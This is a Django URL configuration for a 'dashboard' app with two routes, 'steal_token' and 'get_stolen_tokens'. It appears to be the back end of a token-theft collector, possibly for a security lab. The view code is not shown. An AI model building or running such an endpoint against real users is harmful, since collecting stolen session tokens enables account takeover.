from django.urls import path

from . import views

urlpatterns = [
    # /dashboard/steal_token/
    path('steal_token', views.steal_token, name='steal_token'),
    # /dashboard/get_stolen_tokens/
    path('get_stolen_tokens', views.get_stolen_tokens, name='get_stolen_tokens'),
]